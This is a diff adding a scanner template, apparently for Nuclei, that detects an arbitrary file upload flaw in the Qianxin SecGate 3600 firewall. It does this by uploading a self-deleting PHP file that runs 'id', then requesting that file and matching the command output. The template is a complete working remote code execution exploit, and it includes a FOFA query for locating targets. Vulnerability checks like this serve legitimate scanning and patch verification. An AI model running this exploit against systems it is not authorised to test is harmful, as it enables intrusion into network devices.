@@ -1,0 +1,66 @@
+id: qianxin-legendsec-SecGate-upload
+
+info:
+  name: Qianxin Legendsec SecGate - Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: SecGate 3600 firewall has a vulnerability in the obj_app_upfile interface, allowing arbitrary file uploads. Attackers can gain server privileges by constructing special request packets.
+  reference:
+    - https://peiqi.wgpsec.org/wiki/iot/%E5%A5%87%E5%AE%89%E4%BF%A1/%E7%BD%91%E7%A5%9E%20SecGate%203600%20%E9%98%B2%E7%81%AB%E5%A2%99%20obj_app_upfile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-434
+  metadata:
+    max-request: 2
+    fofa-query: fid="1Lh1LHi6yfkhiO83I59AYg=="
+  tags: qianxin,legendsec,fileupload
+
+variables:
+  filename: '{{rand_base(6)}}.php'
+
+http:
+  - raw:
+      - |
+        POST /?g=obj_app_upfile HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Content-Length: 574
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+        User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="upfile"; filename="{{filename}}"
+        Content-Type: text/plain
+
+        <?php system("id");unlink(__FILE__);?>
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="submit_post"
+
+        obj_app_upfile
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="__hash__"
+
+        0b9d6b1ab7479ab69d9f71b05e0e9445
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+
+      - |
+        GET /attachements/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
+
+      - type: status
+        status:
+          - 200
